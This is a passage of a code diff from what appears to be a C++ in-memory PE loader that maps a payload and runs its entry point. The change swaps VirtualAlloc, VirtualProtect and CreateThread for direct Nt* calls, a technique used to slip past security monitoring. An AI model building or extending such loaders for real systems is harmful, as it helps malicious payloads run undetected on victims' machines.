@@ -357,15 +357,14 @@ void reloc(PIMAGE_NT_HEADERS ntHeaders, void* baseAddress){
 
 void* load_pe(PIMAGE_NT_HEADERS ntHeaders, const vector<unsigned char>& data){
     // Convert to NtAllocateVirtualMemory
-    
+    /*
     void* baseAddress = VirtualAlloc(
         NULL,
         ntHeaders->OptionalHeader.SizeOfImage,
         MEM_COMMIT | MEM_RESERVE, 
         PAGE_READWRITE
-    );
-
-    /*
+    );*/
+    
     void* baseAddress = NULL;
     SIZE_T regionSize = (SIZE_T)ntHeaders->OptionalHeader.SizeOfImage;
     NTSTATUS status = pNtAllocateVirtualMemory(
@@ -380,7 +379,7 @@ void* load_pe(PIMAGE_NT_HEADERS ntHeaders, const vector<unsigned char>& data){
     if (status != 0) {
         cerr << "NtAllocateVirtualMemory failed with status: " << status << endl;
         return nullptr;
-    }*/
+    }
     cout << "Memory allocation at: " << baseAddress << endl;
 
     //memset(baseAddress, 0xAA, ntHeaders->OptionalHeader.SizeOfImage);
@@ -618,12 +617,16 @@ void execute(const vector<unsigned char> &payload) {
     void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
     cout << "Image entry point: " << entryPoint << endl;
     SIZE_T regionSize = 0x1000;
-    VirtualProtect(entryPoint, 0x1000, PAGE_EXECUTE_READ, &oldProtect);
+
+    // Use a copy of the base address because ntprotect aligns it to the page
+    PVOID regionBase = entryPoint;
+    NTSTATUS status = pNtProtectVirtualMemory(CURRENT_PROCESS_HANDLE, &regionBase, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
+    //VirtualProtect(entryPoint, 0x1000, PAGE_EXECUTE_READ, &oldProtect);
 
     // Convert to NT version
     //HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
     HANDLE hThread = NULL;
-    NTSTATUS status = pNtCreateThreadEx(
+    status = pNtCreateThreadEx(
         &hThread,
         THREAD_ALL_ACCESS,
         NULL,
